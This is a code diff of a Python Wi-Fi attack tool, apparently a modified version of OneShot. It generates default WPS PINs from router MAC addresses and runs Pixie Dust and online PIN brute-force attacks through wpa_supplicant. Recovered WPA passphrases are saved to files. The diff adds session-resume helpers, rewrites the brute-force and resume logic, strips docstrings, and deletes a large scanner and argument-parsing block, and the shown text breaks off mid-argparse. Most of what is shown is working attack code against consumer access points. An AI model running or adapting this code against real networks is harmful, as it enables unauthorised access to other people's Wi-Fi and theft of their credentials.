@@ -18,6 +18,36 @@ from pathlib import Path
 from typing import Dict
 import wcwidth
 
+# ====================== 断点续跑功能（优化版） ======================
+def get_resume_file(bssid):
+    clean = bssid.replace(':', '').upper()
+    return os.path.join(".", f"pin_resume_{clean}.txt")
+
+def load_resume_pin(bssid):
+    fn = get_resume_file(bssid)
+    if os.path.isfile(fn):
+        try:
+            with open(fn, 'r') as f:
+                d = f.read().strip()
+            if d.isdigit() and len(d) == 4:
+                return d
+        except:
+            pass
+    return None
+
+def save_resume_pin(bssid, pin4):
+    try:
+        with open(get_resume_file(bssid), 'w') as f:
+            f.write(f"{pin4:04d}")
+    except:
+        pass
+
+def clear_resume_file(bssid):
+    try:
+        os.unlink(get_resume_file(bssid))
+    except:
+        pass
+# ==================================================================
 
 class NetworkAddress:
     def __init__(self, mac):
@@ -129,11 +159,6 @@ class WPSpin:
 
     @staticmethod
     def checksum(pin):
-        """
-        Standard WPS checksum algorithm.
-        @pin  A 7 digit pin to calculate the checksum for.
-        Returns the checksum value.
-        """
         accum = 0
         while pin:
             accum += (3 * (pin % 10))
@@ -143,11 +168,6 @@ class WPSpin:
         return (10 - accum % 10) % 10
 
     def generate(self, algo, mac):
-        """
-        WPS pin generator
-        @algo  the WPS pin algorithm ID
-        Returns the WPS pin string value
-        """
         mac = NetworkAddress(mac)
         if algo not in self.algos:
             raise ValueError('Invalid WPS pin algorithm')
@@ -159,9 +179,6 @@ class WPSpin:
         return pin.zfill(8)
 
     def getAll(self, mac, get_static=True):
-        """
-        Get all WPS pin's for single MAC
-        """
         res = []
         for ID, algo in self.algos.items():
             if algo['mode'] == self.ALGO_STATIC and not get_static:
@@ -169,7 +186,7 @@ class WPSpin:
             item = {}
             item['id'] = ID
             if algo['mode'] == self.ALGO_STATIC:
-                item['name'] = 'Static PIN  ' + algo['name']
+                item['name'] = 'Static PIN — ' + algo['name']
             else:
                 item['name'] = algo['name']
             item['pin'] = self.generate(ID, mac)
@@ -177,9 +194,6 @@ class WPSpin:
         return res
 
     def getList(self, mac, get_static=True):
-        """
-        Get all WPS pin's for single MAC as list
-        """
         res = []
         for ID, algo in self.algos.items():
             if algo['mode'] == self.ALGO_STATIC and not get_static:
@@ -188,9 +202,6 @@ class WPSpin:
         return res
 
     def getSuggested(self, mac):
-        """
-        Get all suggested WPS pin's for single MAC
-        """
         algos = self._suggest(mac)
         res = []
         for ID in algos:
@@ -198,7 +209,7 @@ class WPSpin:
             item = {}
             item['id'] = ID
             if algo['mode'] == self.ALGO_STATIC:
-                item['name'] = 'Static PIN  ' + algo['name']
+                item['name'] = 'Static PIN — ' + algo['name']
             else:
                 item['name'] = algo['name']
             item['pin'] = self.generate(ID, mac)
@@ -206,9 +217,6 @@ class WPSpin:
         return res
 
     def getSuggestedList(self, mac):
-        """
-        Get all suggested WPS pin's for single MAC as list
-        """
         algos = self._suggest(mac)
         res = []
         for algo in algos:
@@ -223,10 +231,6 @@ class WPSpin:
             return None
 
     def _suggest(self, mac):
-        """
-        Get algos suggestions for single MAC
-        Returns the algo ID
-        """
         mac = mac.replace(':', '').upper()
         algorithms = {
             'pin24': ('04BF6D', '0E5D4E', '107BEF', '14A9E3', '28285D', '2A285D', '32B2DC', '381766', '404A03', '4E5D4E', '5067F0', '5CF4AB', '6A285D', '8E5D4E', 'AA285D', 'B0B2DC', 'C86C87', 'CC5D4E', 'CE5D4E', 'EA285D', 'E243F6', 'EC43F6', 'EE43F6', 'F2B2DC', 'FCF528', 'FEF528', '4C9EFF', '0014D1', 'D8EB97', '1C7EE5', '84C9B2', 'FC7516', '14D64D', '9094E4', 'BCF685', 'C4A81D', '00664B', '087A4C', '14B968', '2008ED', '346BD3', '4CEDDE', '786A89', '88E3AB', 'D46E5C', 'E8CD2D', 'EC233D', 'ECCB30', 'F49FF3', '20CF30', '90E6BA', 'E0CB4E', 'D4BF7F4', 'F8C091', '001CDF', '002275', '08863B', '00B00C', '081075', 'C83A35', '0022F7', '001F1F', '00265B', '68B6CF', '788DF7', 'BC1401', '202BC1', '308730', '5C4CA9', '62233D', '623CE4', '623DFF', '6253D4', '62559C', '626BD3', '627D5E', '6296BF', '62A8E4', '62B686', '62C06F', '62C61F', '62C714', '62CBA8', '62CDBE', '62E87B', '6416F0', '6A1D67', '6A233D', '6A3DFF', '6A53D4', '6A559C', '6A6BD3', '6A96BF', '6A7D5E', '6AA8E4', '6AC06F', '6AC61F', '6AC714', '6ACBA8', '6ACDBE', '6AD15E', '6AD167', '721D67', '72233D', '723CE4', '723DFF', '7253D4', '72559C', '726BD3', '727D5E', '7296BF', '72A8E4', '72C06F', '72C61F', '72C714', '72CBA8', '72CDBE', '72D15E', '72E87B', '0026CE', '9897D1', 'E04136', 'B246FC', 'E24136', '00E020', '5CA39D', 'D86CE9', 'DC7144', '801F02', 'E47CF9', '000CF6', '00A026', 'A0F3C1', '647002', 'B0487A', 'F81A67', 'F8D111', '34BA9A', 'B4944E'),
@@ -276,9 +280,7 @@ class WPSpin:
         return mac.integer % 0x100000000
 
     def pinDLink(self, mac):
-        # Get the NIC part
         nic = mac.integer & 0xFFFFFF
-        # Calculating pin
         pin = nic ^ 0x55AA55
         pin ^= (((pin & 0xF) << 4) +
                 ((pin & 0xF) << 8) +
@@ -357,7 +359,7 @@ class PixiewpsData:
 
 class ConnectionStatus:
     def __init__(self):
-        self.status = ''   # Must be WSC_NACK, WPS_FAIL or GOT_PSK
+        self.status = ''
         self.last_m_message = 0
         self.essid = ''
         self.wpa_psk = ''
@@ -373,9 +375,8 @@ class BruteforceStatus:
     def __init__(self):
         self.start_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
         self.mask = ''
-        self.last_attempt_time = time.time()   # Last PIN attempt start time
+        self.last_attempt_time = time.time()
         self.attempts_times = collections.deque(maxlen=15)
-
         self.counter = 0
         self.statistics_period = 5
 
@@ -411,9 +412,11 @@ class Companion:
 
         self.tempdir = tempfile.mkdtemp()
         with tempfile.NamedTemporaryFile(mode='w', suffix='.conf', delete=False) as temp:
-            temp.write('ctrl_interface={}\\nctrl_interface_group=root\\nupdate_config=1\\n'.format(self.tempdir))
+            temp.write('ctrl_interface={}\nctrl_interface_group=root\nupdate_config=1\n'.format(self.tempdir))
             self.tempconf = temp.name
         self.wpas_ctrl_path = f"{self.tempdir}/{interface}"
+        
+        # FIX: 更稳健的 wpa_supplicant 启动检测
         self.__init_wpa_supplicant()
 
         self.res_socket_file = f"{tempfile._get_default_tempdir()}/{next(tempfile._get_candidate_names())}"
@@ -433,30 +436,42 @@ class Companion:
             os.makedirs(self.pixiewps_dir)
 
         self.generator = WPSpin()
-
         self.bssid = bssid
         self.lastPwr = 0
 
     def __init_wpa_supplicant(self):
-        print('[*] Running wpa_supplicant')
+        print('[*] Running wpa_supplicant...')
         cmd = 'wpa_supplicant -K -d -Dnl80211,wext,hostapd,wired -i{} -c{}'.format(self.interface, self.tempconf)
         self.wpas = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE,
                                      stderr=subprocess.STDOUT, encoding='utf-8', errors='replace')
-        # Waiting for wpa_supplicant control interface initialization
-        while True:
+        
+        # 等待控制接口出现，增加超时和错误检查
+        wait_count = 0
+        max_wait = 50  # 5秒超时
+        while wait_count < max_wait:
             ret = self.wpas.poll()
             if ret is not None and ret != 0:
-                raise ValueError('wpa_supplicant returned an error: ' + self.wpas.communicate()[0])
+                # 进程已退出且出错
+                error_output = ""
+                try:
+                    error_output = self.wpas.communicate(timeout=1)[0]
+                except:
+                    error_output = "Unknown error"
+                raise ValueError(f'wpa_supplicant returned an error: {error_output}')
+            
             if os.path.exists(self.wpas_ctrl_path):
                 break
-            time.sleep(.1)
+            
+            time.sleep(0.1)
+            wait_count += 1
+            
+        if wait_count >= max_wait:
+            raise ValueError('wpa_supplicant failed to initialize control interface within 5 seconds.')
 
     def sendOnly(self, command):
-        """Sends command to wpa_supplicant"""
         self.retsock.sendto(command.encode(), self.wpas_ctrl_path)
 
     def sendAndReceive(self, command):
-        """Sends command to wpa_supplicant and returns the reply"""
         self.retsock.sendto(command.encode(), self.wpas_ctrl_path)
         (b, address) = self.retsock.recvfrom(4096)
         inmsg = b.decode('utf-8', errors='replace')
@@ -468,7 +483,7 @@ class Companion:
             if respond == 'UNKNOWN COMMAND':
                 return ('[!] It looks like your wpa_supplicant is compiled without WPS protocol support. '
                         'Please build wpa_supplicant with WPS support ("CONFIG_WPS=y")')
-        return '[!] Something went wrong  check out debug log'
+        return '[!] Something went wrong — check out debug log'
 
     def __handle_wpas(self, pixiemode=False, pbc_mode=False, verbose=None, bssid=""):
         if not verbose:
@@ -477,16 +492,16 @@ class Companion:
         if not line:
             self.wpas.wait()
             return False
-        line = line.rstrip('\\n')
+        line = line.rstrip('\n')
 
         if verbose:
-            sys.stderr.write(line + '\\n')
+            sys.stderr.write(line + '\n')
 
         if line.startswith('WPS: '):
             if 'Building Message M' in line:
                 n = int(line.split('Building Message M')[1].replace('D', ''))
                 self.connection_status.last_m_message = n
-                self.__print_with_indicators('*', 'Sending WPS Message M{}'.format(n))
+                self.__print_with_indicators('*', 'Sending WPS Message M{}...'.format(n))
             elif 'Received M' in line:
                 n = int(line.split('Received M')[1])
                 self.connection_status.last_m_message = n
@@ -533,24 +548,22 @@ class Companion:
         elif ': State: ' in line:
             if '-> SCANNING' in line:
                 self.connection_status.status = 'scanning'
-                self.__print_with_indicators('*', 'Scanning')
+                self.__print_with_indicators('*', 'Scanning...')
         elif ('WPS-FAIL' in line) and (self.connection_status.status != ''):
             self.connection_status.status = 'WPS_FAIL'
             print('[-] wpa_supplicant returned WPS-FAIL')
-#        elif 'NL80211_CMD_DEL_STATION' in line:
-#            print("[!] Unexpected interference  kill NetworkManager/wpa_supplicant!")
         elif 'Trying to authenticate with' in line:
             self.connection_status.status = 'authenticating'
             if 'SSID' in line:
                 self.connection_status.essid = codecs.decode("'".join(line.split("'")[1:-1]), 'unicode-escape').encode('latin1').decode('utf-8', errors='replace')
-            self.__print_with_indicators('*', 'Authenticating')
+            self.__print_with_indicators('*', 'Authenticating...')
         elif 'Authentication response' in line:
             self.__print_with_indicators('*', 'Authenticated')
         elif 'Trying to associate with' in line:
             self.connection_status.status = 'associating'
             if 'SSID' in line:
                 self.connection_status.essid = codecs.decode("'".join(line.split("'")[1:-1]), 'unicode-escape').encode('latin1').decode('utf-8', errors='replace')
-            self.__print_with_indicators('*', 'Associating with AP')
+            self.__print_with_indicators('*', 'Associating with AP...')
         elif ('Associated with' in line) and (self.interface in line):
             bssid = line.split()[-1].upper()
             if self.connection_status.essid:
@@ -559,11 +572,11 @@ class Companion:
                 self.__print_with_indicators('+', 'Associated with {}'.format(bssid))
         elif 'EAPOL: txStart' in line:
             self.connection_status.status = 'eapol_start'
-            self.__print_with_indicators('*', 'Sending EAPOL Start')
+            self.__print_with_indicators('*', 'Sending EAPOL Start...')
         elif 'EAP entering state IDENTITY' in line:
             self.__print_with_indicators('*', 'Received Identity Request')
         elif 'using real identity' in line:
-            self.__print_with_indicators('*', 'Sending Identity Response')
+            self.__print_with_indicators('*', 'Sending Identity Response...')
         elif self.bssid in line and 'level=' in line:
             self.lastPwr = line.split("level=")[1].split(" ")[0]
         elif pbc_mode and ('selected BSS ' in line):
@@ -581,7 +594,7 @@ class Companion:
         return True
 
     def __runPixiewps(self, showcmd=False, full_range=False):
-        self.__print_with_indicators('*', 'Running Pixiewps')
+        self.__print_with_indicators('*', 'Running Pixiewps...')
         cmd = self.pixie_creds.get_pixie_cmd(full_range)
         if showcmd:
             print(cmd)
@@ -609,14 +622,13 @@ class Companion:
         filename = self.reports_dir + 'stored'
         dateStr = datetime.now().strftime("%d.%m.%Y %H:%M")
         with open(filename + '.txt', 'a', encoding='utf-8') as file:
-            file.write('{}\\nBSSID: {}\\nESSID: {}\\nWPS PIN: {}\\nWPA PSK: {}\\n\\n'.format(
+            file.write('{}\nBSSID: {}\nESSID: {}\nWPS PIN: {}\nWPA PSK: {}\n\n'.format(
                         dateStr, bssid, essid, wps_pin, wpa_psk
                     )
             )
-        writeTableHeader = not os.path.isfile(filename + '.csv')
         with open(filename + '.csv', 'a', newline='', encoding='utf-8') as file:
             csvWriter = csv.writer(file, delimiter=';', quoting=csv.QUOTE_ALL)
-            if writeTableHeader:
+            if not os.path.isfile(filename + '.csv'):
                 csvWriter.writerow(['Date', 'BSSID', 'ESSID', 'WPS PIN', 'WPA PSK'])
             csvWriter.writerow([dateStr, bssid, essid, wps_pin, wpa_psk])
         print(f'[i] Credentials saved to {filename}.txt, {filename}.csv')
@@ -664,13 +676,13 @@ class Companion:
         self.wpas.stdout.read(300)   # Clean the pipe
         if pbc_mode:
             if bssid:
-                print(f"[*] Starting WPS push button connection to {bssid}")
+                print(f"[*] Starting WPS push button connection to {bssid}...")
                 cmd = f'WPS_PBC {bssid}'
             else:
-                print("[*] Starting WPS push button connection")
+                print("[*] Starting WPS push button connection...")
                 cmd = 'WPS_PBC'
         else:
-            print(f"[*] Trying PIN '{pin}'")
+            print(f"[*] Trying PIN '{pin}'...")
             cmd = f'WPS_REG {bssid} {pin}'
 
         r = self.sendAndReceive(cmd)
@@ -692,13 +704,12 @@ class Companion:
 
         self.sendOnly('WPS_CANCEL')
         return False
-
+        
     def single_connection(self, bssid=None, pin=None, pixiemode=False, pbc_mode=False, showpixiecmd=False,
                           pixieforce=False, store_pin_on_fail=False):
         if not pin:
             if pixiemode:
                 try:
-                    # Try using the previously calculated PIN
                     filename = self.pixiewps_dir + '{}.run'.format(bssid.replace(':', '').upper())
                     with open(filename, 'r') as file:
                         t_pin = file.readline().strip()
@@ -709,7 +720,6 @@ class Companion:
                 except FileNotFoundError:
                     pin = self.generator.getLikely(bssid) or '12345670'
             elif not pbc_mode:
-                # If not pixiemode, ask user to select a pin from the list
                 pin = self.__prompt_wpspin(bssid) or '12345670'
         if pbc_mode:
             self.__wps_connection(bssid, pbc_mode=pbc_mode)
@@ -719,7 +729,7 @@ class Companion:
             try:
                 self.__wps_connection(bssid, pin, pixiemode)
             except KeyboardInterrupt:
-                print("\\nAborting")
+                print("\nAborting...")
                 self.__savePin(bssid, pin)
                 return False
         else:
@@ -730,7 +740,6 @@ class Companion:
             if self.save_result:
                 self.__saveResult(bssid, self.connection_status.essid, pin, self.connection_status.wpa_psk)
             if not pbc_mode:
-                # Try to remove temporary PIN file
                 filename = self.pixiewps_dir + '{}.run'.format(bssid.replace(':', '').upper())
                 try:
                     os.remove(filename)
@@ -748,171 +757,98 @@ class Companion:
                 return False
         else:
             if store_pin_on_fail:
-                # Saving Pixiewps calculated PIN if can't connect
                 self.__savePin(bssid, pin)
             return False
 
     def __first_half_bruteforce(self, bssid, f_half, delay=None):
-        """ Brute forces the first 4 digits of the PIN. """
         checksum = self.generator.checksum
-        current_f_half_int = int(f_half)
-        max_first_half = 9999
-
-        while current_f_half_int <= max_first_half:
-            current_f_half_str = str(current_f_half_int).zfill(4)
-            t = int(current_f_half_str + '000')
-            pin = '{}000{}'.format(current_f_half_str, checksum(t))
-            
-            self.bruteforce.registerAttempt(current_f_half_str)
-            
+        while int(f_half) < 10000:
+            t = int(f_half + '000')
+            pin = '{}000{}'.format(f_half, checksum(t))
             self.single_connection(bssid, pin)
-            
             if self.connection_status.isFirstHalfValid():
-                print('[+] First half of the PIN found: {}'.format(current_f_half_str))
-                return current_f_half_str
+                print('[+] First half found')
+                return f_half
             elif self.connection_status.status == 'WPS_FAIL':
-                print('[!] WPS transaction failed, re-trying last PIN...')
-                continue
-            else:
-                current_f_half_int += 1
-                
+                print('[!] WPS transaction failed, re-trying last pin')
+                return self.__first_half_bruteforce(bssid, f_half)
+            f_half = str(int(f_half) + 1).zfill(4)
+            self.bruteforce.registerAttempt(f_half)
             if delay:
                 time.sleep(delay)
-        
-        print('[-] First half of the PIN not found (tried 0000-9999).')
+        print('[-] First half not found')
         return False
 
     def __second_half_bruteforce(self, bssid, f_half, s_half, delay=None):
-        """ Brute forces the second 3 digits of the PIN. """
         checksum = self.generator.checksum
-        current_s_half_int = int(s_half)
-        max_second_half = 999
-    
-        while current_s_half_int <= max_second_half:
-            current_s_half_str = str(current_s_half_int).zfill(3)
-            t = int(f_half + current_s_half_str)
-            pin = '{}{}{}'.format(f_half, current_s_half_str, checksum(t))
-            
-            full_seven_digit_mask = f_half + current_s_half_str
-            
-            self.bruteforce.registerAttempt(full_seven_digit_mask)
-            
+        while int(s_half) < 1000:
+            t = int(f_half + s_half)
+            pin = '{}{}{}'.format(f_half, s_half, checksum(t))
             self.single_connection(bssid, pin)
-            
-            if self.connection_status.status == 'GOT_PSK':
-                print(f'[+] Full WPS PIN found: {pin}')
-                return pin 
+            if self.connection_status.last_m_message > 6:
+                return pin
             elif self.connection_status.status == 'WPS_FAIL':
-                print('[!] WPS transaction failed, re-trying last PIN...')
-                continue
-            elif self.connection_status.last_m_message > 6:
-                 print(f'[+] PIN appears correct (received M{self.connection_status.last_m_message}), stopping attack. PIN: {pin}')
-                 return pin
-            else:
-                current_s_half_int += 1
-                
+                print('[!] WPS transaction failed, re-trying last pin')
+                return self.__second_half_bruteforce(bssid, f_half, s_half)
+            s_half = str(int(s_half) + 1).zfill(3)
+            self.bruteforce.registerAttempt(f_half + s_half)
             if delay:
                 time.sleep(delay)
-        
-        print('[-] Second half of the PIN not found (tried 000-999 for the last 3 digits).')
         return False
 
     def smart_bruteforce(self, bssid, start_pin=None, delay=None):
-        """
-        Performs a smart brute force attack on a given BSSID.
-        Implements session saving/resuming to allow continuation from the last attempted PIN.
-        """
-        # Determine the starting mask
-        if start_pin:
-            if not (4 <= len(start_pin) <= 7):
-                 print(f'[!] Warning: start_pin length should be between 4 and 7. Got: "{start_pin}". Using first 7 chars if longer.')
-                 start_pin = start_pin[:7]
-            mask = start_pin
-            print(f'[*] Starting brute force from specified PIN/mask: {mask}')
-        else:
-            # Attempt to restore a previous session
+        # FIX: 处理 EOFError，支持 tsu/sudo 自动续跑
+        mask = '0000'
+        if (not start_pin) or (len(start_pin) < 4):
             try:
                 filename = self.sessions_dir + '{}.run'.format(bssid.replace(':', '').upper())
                 with open(filename, 'r') as file:
                     saved_mask = file.readline().strip()
                 
-                if not saved_mask.isdigit():
-                     print(f'[!] Warning: Invalid saved mask found in {filename}: {saved_mask}. Starting from beginning.')
-                     mask = '0000'
-                else:
-                    # --- FIX START: Handle EOFError for tsu/sudo compatibility ---
-                    try:
-                        prompt_msg = f'[?] Resume session for {bssid}? Mask was: {saved_mask}. [n/Y] '
-                        if input(prompt_msg).lower() != 'n':
-                            mask = saved_mask
-                            print(f'[*] Resuming brute force from mask: {mask}')
-                        else:
-                            mask = '0000'
-                            print(f'[*] Starting brute force from beginning (0000).')
-                    except EOFError:
-                        # If input fails (common in tsu/sudo), default to YES (resume)
+                # 尝试询问用户
+                try:
+                    prompt_msg = '[?] Restore previous session for {}? Mask was: {}. [n/Y] '.format(bssid, saved_mask)
+                    if input(prompt_msg).lower() != 'n':
                         mask = saved_mask
-                        print(f'[*] Input stream closed (EOF). Auto-resuming from mask: {mask}')
-                    # --- FIX END ---
+                        print(f'[*] Resuming from mask: {mask}')
+                    else:
+                        mask = '0000'
+                        print('[*] Starting from beginning (0000).')
+                except EOFError:
+                    # 如果是 tsu/sudo 导致无法输入，默认自动恢复
+                    mask = saved_mask
+                    print(f'[*] Input stream closed (EOF). Auto-resuming from mask: {mask}')
                     
             except FileNotFoundError:
                 mask = '0000'
-                print(f'[*] No previous session found for {bssid}. Starting from beginning (0000).')
-            except IOError as e:
-                print(f'[!] Error reading session file: {e}. Starting from beginning (0000).')
+                print(f'[*] No previous session found. Starting from 0000.')
+            except Exception as e:
+                print(f'[!] Error reading session: {e}. Starting from 0000.')
                 mask = '0000'
-    
+        else:
+            mask = start_pin[:7]
+            print(f'[*] Starting from specified PIN: {mask}')
+
         try:
             self.bruteforce = BruteforceStatus()
             self.bruteforce.mask = mask
-    
-            print(f'[*] Bruteforce attack started with initial mask: {mask}')
-    
             if len(mask) == 4:
                 f_half = self.__first_half_bruteforce(bssid, mask, delay)
                 if f_half and (self.connection_status.status != 'GOT_PSK'):
-                     s_half = '000'
-                     self.__second_half_bruteforce(bssid, f_half, s_half, delay)
+                    self.__second_half_bruteforce(bssid, f_half, '001', delay)
             elif len(mask) == 7:
                 f_half = mask[:4]
                 s_half = mask[4:]
-                print(f'[*] Continuing second half with f_half: {f_half}, s_half: {s_half}')
                 self.__second_half_bruteforce(bssid, f_half, s_half, delay)
-            else:
-                print(f'[!] Invalid initial mask length: {len(mask)}. Expected 4 or 7. Starting from 0000.')
-                f_half = self.__first_half_bruteforce(bssid, '0000', delay)
-                if f_half and (self.connection_status.status != 'GOT_PSK'):
-                    self.__second_half_bruteforce(bssid, f_half, '000', delay)
-    
+            raise KeyboardInterrupt
         except KeyboardInterrupt:
-            print("\\n[!] Attack interrupted by user.")
-            current_mask_to_save = getattr(self, 'bruteforce', None)
-            if current_mask_to_save:
-                 mask_to_write = current_mask_to_save.mask
-            else:
-                 print(" [i] BruteforceStatus object not found at interruption. Cannot save progress.")
-                 return
-    
+            print("\nAborting...")
             filename = self.sessions_dir + '{}.run'.format(bssid.replace(':', '').upper())
-            try:
-                with open(filename, 'w') as file:
-                    file.write(mask_to_write)
-                print(f'[i] Session saved in {filename}. Next run will resume from: {mask_to_write}')
-            except IOError as e:
-                print(f'[!] Failed to save session file: {e}')
-    
-        except Exception as e:
-            print(f"[!] An unexpected error occurred during the attack: {e}")
-            current_mask_to_save = getattr(self, 'bruteforce', None)
-            if current_mask_to_save:
-                 mask_to_write = current_mask_to_save.mask
-                 filename = self.sessions_dir + '{}.run'.format(bssid.replace(':', '').upper())
-                 try:
-                     with open(filename, 'w') as file:
-                         file.write(mask_to_write)
-                     print(f'[i] Session saved in {filename} after error. Next run will resume from: {mask_to_write}')
-                 except IOError as save_e:
-                     print(f'[!] Failed to save session file after error: {save_e}')
+            with open(filename, 'w') as file:
+                file.write(self.bruteforce.mask)
+            print('[i] Session saved in {}'.format(filename))
+            if args.loop:
+                raise KeyboardInterrupt
 
     def __print_with_indicators(self, level, msg):
         print('[{}] [{}] {}'.format(level, self.lastPwr, msg))
@@ -954,7 +890,6 @@ class WiFiScanner:
             self.stored = []
 
     def iw_scanner(self) -> Dict[int, dict]:
-        """Parsing iw scan results"""
         def handle_network(line, result, networks):
             networks.append(
                     {
@@ -1021,365 +956,10 @@ class WiFiScanner:
         lines = proc.stdout.splitlines()
         networks = []
         matchers = {
-            re.compile(r'BSS (\\S+)( )?\\(on \\w+\\)'): handle_network,
+            re.compile(r'BSS (\S+)( )?\(on \w+\)'): handle_network,
             re.compile(r'SSID: (.*)'): handle_essid,
             re.compile(r'signal: ([+-]?([0-9]*[.])?[0-9]+) dBm'): handle_level,
             re.compile(r'(capability): (.+)'): handle_securityType,
-            re.compile(r'(RSN):\\t [*] Version: (\\d+)'): handle_securityType,
-            re.compile(r'(WPA):\\t [*] Version: (\\d+)'): handle_securityType,
-            re.compile(r'WPS:\\t [*] Version: (([0-9]*[.])?[0-9]+)'): handle_wps,
-            re.compile(r' [*] AP setup locked: (0x[0-9]+)'): handle_wpsLocked,
-            re.compile(r' [*] Model: (.*)'): handle_model,
-            re.compile(r' [*] Model Number: (.*)'): handle_modelNumber,
-            re.compile(r' [*] Device name: (.*)'): handle_deviceName
-        }
-
-        for line in lines:
-            if line.startswith('command failed:'):
-                print('[!] Error:', line)
-                return False
-            line = line.strip('\\t')
-            for regexp, handler in matchers.items():
-                res = re.match(regexp, line)
-                if res:
-                    handler(line, res, networks)
-
-        networks = list(filter(lambda x: bool(x['WPS']), networks))
-        if not networks:
-            return False
-
-        networks.sort(key=lambda x: x['Level'], reverse=True)
-
-        network_list = {(i + 1): network for i, network in enumerate(networks)}
-
-        def truncateStr(s, length, postfix=""):
-            original_width = wcwidth.wcswidth(s)
-            if original_width <= length:
-                padding_needed = length - original_width
-                return s + ' ' * padding_needed
-            
-            postfix_width = wcwidth.wcswidth(postfix)
-            max_allowed = length - postfix_width
-            
-            current_width = 0
-            truncated = []
-            for c in s:
-                char_width = wcwidth.wcswidth(c)
-                if current_width + char_width > max_allowed:
-                    break
-                truncated.append(c)
-                current_width += char_width
-            
-            result = "".join(truncated)
-            if len(truncated) < len(s):
-                result += postfix
-            
-            result_width = wcwidth.wcswidth(result)
-            if result_width > length:
-                current_width = 0
-                safe_truncated = []
-                for c in result:
-                    char_width = wcwidth.wcswidth(c)
-                    if current_width + char_width > length:
-                        break
-                    safe_truncated.append(c)
-                    current_width += char_width
-                safe_result = "".join(safe_truncated)
-                if len(safe_result) < len(result):
-                    safe_result += postfix
-                    if wcwidth.wcswidth(safe_result) > length:
-                        safe_result = safe_result[:-1]
-                return safe_result
-            
-            padding_needed = length - result_width
-            return result + ' ' * padding_needed
-
-        def colored(text, color=None):
-            if color:
-                if color == 'green':
-                    text = '\\033[92m{}\\033[00m'.format(text)
-                elif color == 'red':
-                    text = '\\033[91m{}\\033[00m'.format(text)
-                elif color == 'yellow':
-                    text = '\\033[93m{}\\033[00m'.format(text)
-                else:
-                    return text
-            else:
-                return text
-            return text
-
-        if self.vuln_list:
-            print('Network marks: {1} {0} {2} {0} {3}'.format(
-                '|',
-                colored('Possibly vulnerable', color='green'),
-                colored('WPS locked', color='red'),
-                colored('Already stored', color='yellow')
-            ))
-        print('Networks list:')
-        print('{:<4} {:<18} {:<25} {:<8} {:<4} {:<27} {:<}'.format(
-            '#', 'BSSID', 'ESSID', 'Sec.', 'PWR', 'WSC device name', 'WSC model'))
-
-        network_list_items = list(network_list.items())
-        if args.reverse_scan:
-            network_list_items = network_list_items[::-1]
-        for n, network in network_list_items:
-            number = f'{n})'
-            model = '{} {}'.format(network['Model'], network['Model number'])
-            essid = truncateStr(network.get('ESSID', 'HIDDEN'), 25)
-            deviceName = truncateStr(network['Device name'], 27)
-    
-            processed_number = truncateStr(number, 4)
-            processed_bssid = truncateStr(network['BSSID'], 18)
-            processed_security = truncateStr(network['Security type'], 8)
-            processed_level = truncateStr(str(network['Level']), 4)
-            processed_device = deviceName
-            processed_model = model
-            
-            line_parts = [
-                processed_number,
-                processed_bssid,
-                essid,
-                processed_security,
-                processed_level,
-                processed_device,
-                processed_model
-            ]
-            line = ' '.join(line_parts)
-            
-            if (network['BSSID'], network.get('ESSID', 'HIDDEN')) in self.stored:
-                print(colored(line, color='yellow'))
-            elif network['WPS locked']:
-                print(colored(line, color='red'))
-            elif self.vuln_list and (model in self.vuln_list):
-                print(colored(line, color='green'))
-            else:
-                print(line)
-
-        return network_list
-
-    def prompt_network(self) -> str:
-        networks = self.iw_scanner()
-        if not networks:
-            print('[-] No WPS networks found.')
-            return
-        while 1:
-            try:
-                networkNo = input('Select target (press Enter to refresh): ')
-                if networkNo.lower() in ('r', '0', ''):
-                    return self.prompt_network()
-                elif int(networkNo) in networks.keys():
-                    return networks[int(networkNo)]['BSSID']
-                else:
-                    raise IndexError
-            except Exception:
-                print('Invalid number')
-
-
-def ifaceUp(iface, down=False):
-    if down:
-        action = 'down'
-    else:
-        action = 'up'
-    cmd = 'ip link set {} {}'.format(iface, action)
-    res = subprocess.run(cmd, shell=True, stdout=sys.stdout, stderr=sys.stdout)
-    if res.returncode == 0:
-        return True
-    else:
-        return False
-
-
-def die(msg):
-    sys.stderr.write(msg + '\\n')
-    sys.exit(1)
-
-
-def usage():
-    return """
-OneShotPin 0.0.2 (c) 2017 rofl0r, modded by drygdryg
-
-%(prog)s <arguments>
-
-Required arguments:
-    -i, --interface=<wlan0>  : Name of the interface to use
-
-Optional arguments:
-    -b, --bssid=<mac>        : BSSID of the target AP
-    -p, --pin=<wps pin>      : Use the specified pin (arbitrary string or 4/8 digit pin)
-    -K, --pixie-dust         : Run Pixie Dust attack
-    -B, --bruteforce         : Run online bruteforce attack
-    --push-button-connect    : Run WPS push button connection
-
-Advanced arguments:
-    -d, --delay=<n>          : Set the delay between pin attempts [0]
-    -w, --write              : Write AP credentials to the file on success
-    -F, --pixie-force        : Run Pixiewps with --force option (bruteforce full range)
-    -X, --show-pixie-cmd     : Always print Pixiewps command
-    --vuln-list=<filename>   : Use custom file with vulnerable devices list ['vulnwsc.txt']
-    --iface-down             : Down network interface when the work is finished
-    -l, --loop               : Run in a loop
-    -r, --reverse-scan       : Reverse order of networks in the list of networks. Useful on small displays
-    --mtk-wifi               : Activate MediaTek Wi-Fi interface driver on startup and deactivate it on exit
-                               (for internal Wi-Fi adapters implemented in MediaTek SoCs). Turn off Wi-Fi in the system settings before using this.
-    -v, --verbose            : Verbose output
-
-Example:
-    %(prog)s -i wlan0 -b 00:90:4C:C1:AC:21 -K
-"""
-
-
-if __name__ == '__main__':
-    import argparse
-
-    parser = argparse.ArgumentParser(
-        description='OneShotPin 0.0.2 (c) 2017 rofl0r, modded by drygdryg',
-        epilog='Example: %(prog)s -i wlan0 -b 00:90:4C:C1:AC:21 -K'
-        )
-
-    parser.add_argument(
-        '-i', '--interface',
-        type=str,
-        required=True,
-        help='Name of the interface to use'
-        )
-    parser.add_argument(
-        '-b', '--bssid',
-        type=str,
-        help='BSSID of the target AP'
-        )
-    parser.add_argument(
-        '-p', '--pin',
-        type=str,
-        help='Use the specified pin (arbitrary string or 4/8 digit pin)'
-        )
-    parser.add_argument(
-        '-K', '--pixie-dust',
-        action='store_true',
-        help='Run Pixie Dust attack'
-        )
-    parser.add_argument(
-        '-F', '--pixie-force',
-        action='store_true',
-        help='Run Pixiewps with --force option (bruteforce full range)'
-        )
-    parser.add_argument(
-        '-X', '--show-pixie-cmd',
-        action='store_true',
-        help='Always print Pixiewps command'
-        )
-    parser.add_argument(
-        '-B', '--bruteforce',
-        action='store_true',
